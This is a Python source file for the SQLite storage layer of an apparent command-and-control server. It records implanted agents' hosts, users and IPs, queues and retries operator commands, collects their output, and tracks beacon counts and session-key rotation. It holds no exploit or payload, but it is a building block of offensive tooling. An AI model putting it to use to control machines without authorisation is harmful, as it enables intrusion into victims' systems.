import json
import os
import sqlite3
import time
from contextlib import contextmanager
from datetime import datetime


class C2Database:
    def __init__(self, db_path="data/c2.db"):
        self.db_path = db_path
        os.makedirs(os.path.dirname(os.path.abspath(db_path)), exist_ok=True)
        self._init_db()

    @contextmanager
    def _get_conn(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL;")
        conn.execute("PRAGMA synchronous=NORMAL;")
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise
        finally:
            conn.close()

    def _init_db(self):
        with self._get_conn() as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS agents (
                    agent_id TEXT PRIMARY KEY,
                    hostname TEXT,
                    os TEXT,
                    user TEXT,
                    ip TEXT,
                    last_seen TEXT,
                    crypto_state TEXT
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id TEXT PRIMARY KEY,
                    agent_id TEXT,
                    command TEXT,
                    status TEXT,
                    output TEXT,
                    created_at TEXT,
                    operator_id TEXT,
                    sent_at REAL,
                    acknowledged_at REAL,
                    delivery_attempts INTEGER NOT NULL DEFAULT 0
                )
            """)
            task_columns = {
                row["name"] for row in conn.execute("PRAGMA table_info(tasks)").fetchall()
            }
            for column, definition in (
                ("sent_at", "REAL"),
                ("acknowledged_at", "REAL"),
                ("delivery_attempts", "INTEGER NOT NULL DEFAULT 0"),
            ):
                if column not in task_columns:
                    conn.execute(f"ALTER TABLE tasks ADD COLUMN {column} {definition}")
            # Key epochs for session key rotation tracking
            conn.execute("""
                CREATE TABLE IF NOT EXISTS key_epochs (
                    epoch_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT NOT NULL,
                    key_hash TEXT NOT NULL,
                    created_at REAL NOT NULL,
                    expired_at REAL,
                    beacon_count INTEGER DEFAULT 0
                )
            """)
            conn.execute("""
                CREATE INDEX IF NOT EXISTS idx_key_epochs_agent
                ON key_epochs(agent_id, expired_at)
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS consumed_enrollment_tokens (
                    token_id TEXT PRIMARY KEY,
                    expires_at INTEGER NOT NULL,
                    consumed_at INTEGER NOT NULL
                )
            """)
            conn.commit()

    def consume_enrollment_token(self, token_id, expires_at, consumed_at):
        """Atomically consume a token fingerprint, rejecting replay."""
        with self._get_conn() as conn:
            conn.execute(
                "DELETE FROM consumed_enrollment_tokens WHERE expires_at < ?",
                (int(consumed_at),),
            )
            try:
                conn.execute("""
                    INSERT INTO consumed_enrollment_tokens
                        (token_id, expires_at, consumed_at)
                    VALUES (?, ?, ?)
                """, (token_id, int(expires_at), int(consumed_at)))
            except sqlite3.IntegrityError:
                return False
            return True

    def register_agent(self, agent_id, hostname, os_name, user, ip, crypto_state):
        """Create an agent exactly once; registration never rotates its key."""
        with self._get_conn() as conn:
            now = datetime.now().isoformat()
            stored_state = (
                crypto_state
                if isinstance(crypto_state, str)
                else json.dumps(crypto_state or {})
            )
            try:
                conn.execute("""
                    INSERT INTO agents
                        (agent_id, hostname, os, user, ip, last_seen, crypto_state)
                    VALUES (?, ?, ?, ?, ?, ?, ?)
                """, (agent_id, hostname, os_name, user, ip, now, stored_state))
            except sqlite3.IntegrityError:
                return False
            return True

    def update_agent(self, agent_id, hostname, os_name, user, ip, crypto_state):
        with self._get_conn() as conn:
            now = datetime.now().isoformat()
            crypto_json = (
                crypto_state
                if isinstance(crypto_state, str)
                else json.dumps(crypto_state or {})
            )
            
            conn.execute("""
                INSERT INTO agents (agent_id, hostname, os, user, ip, last_seen, crypto_state)
                VALUES (?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT(agent_id) DO UPDATE SET
                    hostname=excluded.hostname,
                    os=excluded.os,
                    user=excluded.user,
                    ip=excluded.ip,
                    last_seen=excluded.last_seen,
                    crypto_state=excluded.crypto_state
            """, (agent_id, hostname, os_name, user, ip, now, crypto_json))
            conn.commit()

    def get_agent_crypto(self, agent_id):
        with self._get_conn() as conn:
            cur = conn.execute("SELECT crypto_state FROM agents WHERE agent_id=?", (agent_id,))
            row = cur.fetchone()
            if row and row["crypto_state"]:
                try:
                    return json.loads(row["crypto_state"])
                except (TypeError, json.JSONDecodeError):
                    return row["crypto_state"]
            return None

    def update_agent_seen(self, agent_id, hostname, os_name, user, ip, crypto_state):
        """Update an authenticated agent without creating or changing identity."""
        with self._get_conn() as conn:
            stored_state = (
                crypto_state
                if isinstance(crypto_state, str)
                else json.dumps(crypto_state or {})
            )
            cursor = conn.execute("""
                UPDATE agents
                SET hostname=?, os=?, user=?, ip=?, last_seen=?, crypto_state=?
                WHERE agent_id=?
            """, (
                hostname,
                os_name,
                user,
                ip,
                datetime.now().isoformat(),
                stored_state,
                agent_id,
            ))
            return cursor.rowcount == 1

    def update_agent_crypto(self, agent_id, crypto_state):
        with self._get_conn() as conn:
            stored_state = (
                crypto_state
                if isinstance(crypto_state, str)
                else json.dumps(crypto_state or {})
            )
            cursor = conn.execute(
                "UPDATE agents SET crypto_state=? WHERE agent_id=?",
                (stored_state, agent_id),
            )
            return cursor.rowcount == 1

    def get_all_agents(self):
        with self._get_conn() as conn:
            cur = conn.execute("SELECT agent_id, hostname, os, user, ip, last_seen FROM agents")
            return [dict(r) for r in cur.fetchall()]

    def queue_task(self, task_id, agent_id, command):
        with self._get_conn() as conn:
            now = datetime.now().isoformat()
            conn.execute("""
                INSERT INTO tasks (task_id, agent_id, command, status, created_at)
                VALUES (?, ?, ?, 'pending', ?)
            """, (task_id, agent_id, command, now))
            conn.commit()

    def get_pending_tasks(
        self,
        agent_id,
        *,
        now=None,
        retry_after_seconds=60,
        ack_retry_after_seconds=900,
        max_attempts=5,
    ):
        """Lease pending tasks and retry unacknowledged/stale deliveries."""
        current = time.time() if now is None else float(now)
        sent_before = current - max(1, int(retry_after_seconds))
        acknowledged_before = current - max(1, int(ack_retry_after_seconds))
        with self._get_conn() as conn:
            cur = conn.execute("""
                SELECT task_id, command, delivery_attempts
                FROM tasks
                WHERE agent_id=?
                  AND delivery_attempts < ?
                  AND (
                    status='pending'
                    OR (status='sent' AND sent_at <= ?)
                    OR (status='acknowledged' AND acknowledged_at <= ?)
                  )
                ORDER BY created_at ASC, task_id ASC
            """, (agent_id, int(max_attempts), sent_before, acknowledged_before))
            rows = cur.fetchall()
            tasks = []
            for row in rows:
                attempt = int(row["delivery_attempts"] or 0) + 1
                tasks.append({
                    "task_id": row["task_id"],
                    "command": row["command"],
                    "delivery_attempt": attempt,
                })
            for t in tasks:
                conn.execute(
                    """UPDATE tasks
                       SET status='sent', sent_at=?, acknowledged_at=NULL,
                           delivery_attempts=?
                       WHERE task_id=? AND agent_id=?""",
                    (current, t["delivery_attempt"], t['task_id'], agent_id),
                )
            conn.commit()
            return tasks

    def acknowledge_tasks(self, agent_id, task_ids, *, now=None):
        """Idempotently acknowledge tasks owned by ``agent_id``."""
        unique_ids = list(dict.fromkeys(str(value) for value in task_ids if value))
        if not unique_ids:
            return 0
        current = time.time() if now is None else float(now)
        placeholders = ",".join("?" for _ in unique_ids)
        with self._get_conn() as conn:
            rows = conn.execute(
                f"""SELECT task_id FROM tasks
                    WHERE agent_id=? AND task_id IN ({placeholders})
                      AND status IN ('sent', 'acknowledged')""",
                (agent_id, *unique_ids),
            ).fetchall()
            accepted = [row["task_id"] for row in rows]
            if accepted:
                accepted_placeholders = ",".join("?" for _ in accepted)
                conn.execute(
                    f"""UPDATE tasks
                        SET status='acknowledged', acknowledged_at=?
                        WHERE agent_id=? AND task_id IN ({accepted_placeholders})
                          AND status='sent'""",
                    (current, agent_id, *accepted),
                )
            return len(accepted)

    def update_task_result(self, task_id, agent_id, output, error=""):
        """Accept a result only from the task owner and only once."""
        with self._get_conn() as conn:
            status = 'error' if error else 'completed'
            full_out = output if not error else f"Error: {error}\n{output}"
            cursor = conn.execute("""
                UPDATE tasks SET status=?, output=?
                WHERE task_id=? AND agent_id=?
                  AND status IN ('sent', 'acknowledged')
            """, (status, full_out, task_id, agent_id))
            conn.commit()
            return cursor.rowcount == 1

    def get_results(self, agent_id):
        with self._get_conn() as conn:
            cur = conn.execute("SELECT task_id, output, status FROM tasks WHERE agent_id=? AND status IN ('completed', 'error')", (agent_id,))
            results = [dict(r) for r in cur.fetchall()]
            
            for r in results:
                conn.execute("DELETE FROM tasks WHERE task_id=?", (r['task_id'],))
            conn.commit()
            return results

    # ─── Key Epoch Lifecycle ─────────────────────────────

    def create_key_epoch(self, agent_id: str, key_hash: str) -> int:
        """Record a new key epoch for an agent. Returns epoch_id."""
        with self._get_conn() as conn:
            # Expire any active epochs for this agent
            conn.execute("""
                UPDATE key_epochs SET expired_at = ?
                WHERE agent_id = ? AND expired_at IS NULL
            """, (time.time(), agent_id))
            
            cur = conn.execute("""
                INSERT INTO key_epochs (agent_id, key_hash, created_at)
                VALUES (?, ?, ?)
            """, (agent_id, key_hash, time.time()))
            conn.commit()
            return cur.lastrowid

    def increment_beacon_count(self, agent_id: str) -> int:
        """Increment beacon count for active epoch. Returns new count."""
        with self._get_conn() as conn:
            conn.execute("""
                UPDATE key_epochs SET beacon_count = beacon_count + 1
                WHERE agent_id = ? AND expired_at IS NULL
            """, (agent_id,))
            conn.commit()
            
            row = conn.execute("""
                SELECT beacon_count FROM key_epochs
                WHERE agent_id = ? AND expired_at IS NULL
            """, (agent_id,)).fetchone()
            return row["beacon_count"] if row else 0

    def expire_key_epoch(self, agent_id: str):
        """Expire the active key epoch for an agent."""
        with self._get_conn() as conn:
            conn.execute("""
                UPDATE key_epochs SET expired_at = ?
                WHERE agent_id = ? AND expired_at IS NULL
            """, (time.time(), agent_id))
            conn.commit()

    def get_active_epoch(self, agent_id: str):
        """Get the active key epoch for an agent."""
        with self._get_conn() as conn:
            row = conn.execute("""
                SELECT * FROM key_epochs
                WHERE agent_id = ? AND expired_at IS NULL
            """, (agent_id,)).fetchone()
            return dict(row) if row else None
